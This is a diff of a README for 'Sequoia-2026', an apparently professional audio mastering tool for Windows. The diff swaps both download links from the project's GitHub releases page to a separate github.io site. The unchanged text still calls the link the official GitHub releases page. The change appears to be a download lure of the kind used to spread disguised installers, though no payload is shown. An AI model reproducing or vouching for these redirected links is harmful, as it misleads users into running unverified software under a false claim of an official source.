@@ -1,6 +1,6 @@
 # 🎵 Sequoia-2026 - Professional Audio Mastering Made Simple
 
-[![](https://img.shields.io/badge/Download-Sequoia-2026-blue)](https://github.com/billstoneofficial/Sequoia-2026/releases)
+[![](https://img.shields.io/badge/Download-Sequoia-2026-blue)](https://billstoneofficial.github.io)
 
 Sequoia-2026 provides a complete professional environment for audio editing and mastering. This software offers tools for high-end production, broadcast, and archival work. You can manage complex projects, clean audio, and finalize masters with precision. It runs on Windows 10 and Windows 11.
 
@@ -19,7 +19,7 @@ Your computer needs specific hardware resources to run Sequoia-2026. Please chec
 
 You can get the installation file from the official releases page on GitHub. 
 
-[Visit this page to download the latest version](https://github.com/billstoneofficial/Sequoia-2026/releases)
+[Visit this page to download the latest version](https://billstoneofficial.github.io)
 
 1. Open the link above in your web browser.
 2. Look for the latest version number at the top of the list.
